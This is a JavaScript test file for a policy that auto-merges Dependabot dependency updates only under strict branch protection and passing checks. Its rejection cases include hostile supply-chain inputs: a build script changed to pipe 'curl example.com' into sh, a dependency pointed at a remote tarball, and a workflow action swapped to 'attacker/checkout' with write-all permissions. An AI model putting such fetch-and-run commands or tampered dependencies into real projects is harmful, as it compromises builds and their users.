'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const policy = require('./dependency-maintenance.cjs');

const repository = 'owner/app';
const sha = '1'.repeat(40);
const rule = { requiresStatusChecks: true, requiresStrictStatusChecks: true, isAdminEnforced: true,
  requiredStatusChecks: policy.requiredChecks.map(context => ({ context, app: { databaseId: 15368 } })) };
const branch = { protected: true, protection: { enabled: true, required_status_checks: {
  enforcement_level: 'everyone', checks: policy.requiredChecks.map(context => ({ context, app_id: 15368 }))
} }, commit: { sha: '0'.repeat(40) } };
const rules = [{ type: 'required_status_checks', parameters: {
  strict_required_status_checks_policy: true,
  required_status_checks: policy.requiredChecks.map(context => ({ context, integration_id: 15368 }))
} }];
const pr = { number: 1, state: 'open', draft: false, changed_files: 1, mergeable_state: 'clean',
  user: { login: 'dependabot[bot]', type: 'Bot' },
  base: { ref: 'main', sha: '0'.repeat(40), repo: { full_name: repository } },
  head: { ref: 'dependabot/npm_and_yarn/update', sha, repo: { full_name: repository } } };
const run = { id: 4, head_sha: sha, status: 'completed', conclusion: 'success', pull_requests: [{ number: 1 }] };
const jobs = policy.requiredChecks.map(name => ({ name, status: 'completed', conclusion: 'success' }));

test('only a same-repository, non-draft Dependabot PR to main is eligible', () => {
  assert.equal(policy.isDependencyPullRequest(pr, repository, 'main'), true);
  for (const patch of [{ draft: true }, { state: 'closed' }, { user: { login: 'owner', type: 'User' } },
    { base: { ...pr.base, ref: 'release' } }, { head: { ...pr.head, repo: { full_name: 'fork/app' } } },
    { head: { ...pr.head, ref: 'feature' } }]) {
    assert.equal(policy.isDependencyPullRequest({ ...pr, ...patch }, repository, 'main'), false);
  }
});

test('protection must enforce all checks, strict freshness, and admins', () => {
  assert.equal(policy.hasRequiredProtection(rule), true);
  for (const changed of [undefined, { ...rule, requiresStrictStatusChecks: false }, { ...rule, isAdminEnforced: false },
    { ...rule, requiredStatusChecks: rule.requiredStatusChecks.slice(1) },
    { ...rule, requiredStatusChecks: policy.requiredChecks.map(context => ({ context, app: null })) }]) {
    assert.equal(Boolean(policy.hasRequiredProtection(changed)), false);
  }
});

test('readable REST summaries require admin enforcement and strict app-bound applied rules', () => {
  assert.equal(policy.hasRequiredBranchChecks(branch), true);
  assert.equal(policy.hasStrictRules(rules), true);
  for (const changed of [undefined, { ...branch, protected: false }, { ...branch, protection: {
    ...branch.protection, required_status_checks: { ...branch.protection.required_status_checks, enforcement_level: 'non_admins' }
  } }, { ...branch, protection: { ...branch.protection, required_status_checks: {
    ...branch.protection.required_status_checks, checks: policy.requiredChecks.map(context => ({ context, app_id: null }))
  } } }]) assert.equal(Boolean(policy.hasRequiredBranchChecks(changed)), false);
  for (const changed of [undefined, [], [{ ...rules[0], parameters: {
    ...rules[0].parameters, strict_required_status_checks_policy: false
  } }], [{ ...rules[0], parameters: { ...rules[0].parameters, required_status_checks: rules[0].parameters.required_status_checks.slice(1) } }],
    [{ ...rules[0], parameters: { ...rules[0].parameters, required_status_checks: policy.requiredChecks.map(context => ({ context })) } }]]) {
    assert.equal(Boolean(policy.hasStrictRules(changed)), false);
  }
});

test('major npm updates are allowed; scripts, package additions, and executable URLs are rejected', () => {
  const before = { name: 'app', scripts: { build: 'node build.mjs' }, devDependencies: { electron: '44.5.1' } };
  const after = { ...before, devDependencies: { electron: '45.0.0' } };
  assert.equal(policy.isDependencyManifest(before, after), true);
  assert.equal(policy.isDependencyManifest(before, { ...after, scripts: { build: 'curl example.com | sh' } }), false);
  assert.equal(policy.isDependencyManifest(before, { ...after, devDependencies: { electron: 'https://example.com/app.tgz' } }), false);
  assert.equal(policy.isDependencyManifest(before, { ...after, devDependencies: { electron: '45.0.0', injected: '1.0.0' } }), false);
  assert.equal(policy.isDependencyManifest(before, { ...after, version: '2.0.0' }), false);
});

test('action updates must retain the action identity, SHA pin, and all workflow logic', () => {
  const before = `steps:\n  - uses: actions/checkout@${'a'.repeat(40)} # v7.0.1\n  - run: npm test\n`;
  const after = before.replace('a'.repeat(40), 'b'.repeat(40)).replace('v7.0.1', 'v8.0.0');
  assert.equal(policy.isActionVersionUpdate(before, after), true);
  for (const changed of [after.replace('npm test', 'echo skipped'), after.replace('actions/checkout', 'attacker/checkout'),
    after.replace('b'.repeat(40), 'main'), after.replace('  - run', '    - run'), after + 'permissions: write-all\n']) {
    assert.equal(policy.isActionVersionUpdate(before, changed), false);
  }
});

test('missing, skipped, cancelled, neutral, failed, or stale checks never permit merging', () => {
  assert.equal(policy.passedChecks(run, jobs, sha), true);
  assert.equal(policy.passedChecks(run, jobs.slice(1), sha), false);
  assert.equal(policy.passedChecks({ ...run, head_sha: 'old' }, jobs, sha), false);
  assert.equal(policy.passedChecks({ ...run, status: 'in_progress' }, jobs, sha), false);
  for (const conclusion of ['skipped', 'cancelled', 'neutral', 'failure', null]) {
    assert.equal(policy.passedChecks(run, [{ ...jobs[0], conclusion }, ...jobs.slice(1)], sha), false);
  }
});

function fixture(change = {}) {
  const merges = [];
  const notices = [];
  let reads = 0;
  const github = {
    paginate: async (method, args) => method(args),
    rest: {
      repos: {
        get: async () => ({ data: { full_name: repository, default_branch: 'main', allow_auto_merge: true, allow_squash_merge: true } }),
        getBranch: async () => ({ data: change.branch ?? branch }),
        getBranchRules: async () => change.rules ?? rules,
        compareCommitsWithBasehead: async () => ({ data: { status: change.behind ? 'diverged' : 'ahead' } })
      },
      pulls: {
        list: async () => [pr],
        get: async () => ({ data: ++reads > 1 && change.newHead ? { ...pr, head: { ...pr.head, sha: 'changed' } } : pr }),
        listFiles: async () => [{ filename: change.file ?? 'package-lock.json', status: 'modified' }],
        merge: async args => {
          merges.push(args);
          if (change.conflict) throw Object.assign(new Error('Head changed'), { status: 409 });
          return { data: { merged: true, sha: 'merged' } };
        }
      },
      actions: {
        listWorkflowRuns: async () => ({ data: { workflow_runs: change.pending ? [run, { ...run, id: 5, status: 'in_progress' }] : [run] } }),
        listJobsForWorkflowRun: async () => jobs
      }
    }
  };
  const core = { info() {}, warning() {}, notice: text => notices.push(text) };
  return { github, context: { repo: { owner: 'owner', repo: 'app' } }, core, merges, notices };
}

test('a successful merge uses squash and the exact tested revision', async () => {
  const state = fixture();
  await policy.mergeDependencyUpdates(state);
  assert.deepEqual(state.merges, [{ owner: 'owner', repo: 'app', pull_number: 1, sha, merge_method: 'squash' }]);
  assert.equal(state.notices.length, 1);
});

test('scope violations, pending reruns, stale bases, and changed heads leave PRs open', async () => {
  for (const change of [{ file: 'src/main/index.ts' }, { pending: true }, { behind: true }, { newHead: true }]) {
    const state = fixture(change);
    await policy.mergeDependencyUpdates(state);
    assert.equal(state.merges.length, 0);
  }
  const state = fixture({ branch: { ...branch, protected: false } });
  await assert.rejects(policy.mergeDependencyUpdates(state), /strict main protection/);
  assert.equal(state.merges.length, 0);
});

test('inaccessible or missing applied rules fail closed without an administration-token fallback', async () => {
  for (const missing of [false, true]) {
    const state = fixture({ rules: [] });
    if (!missing) state.github.rest.repos.getBranchRules = async () => {
      throw Object.assign(new Error('Resource not accessible by integration'), { status: 403 });
    };
    await assert.rejects(policy.mergeDependencyUpdates(state));
    assert.equal(state.merges.length, 0);
  }
});

test('a merge race rejected by GitHub is not reported as a successful merge', async () => {
  const state = fixture({ conflict: true });
  await policy.mergeDependencyUpdates(state);
  assert.equal(state.notices.length, 0);
});
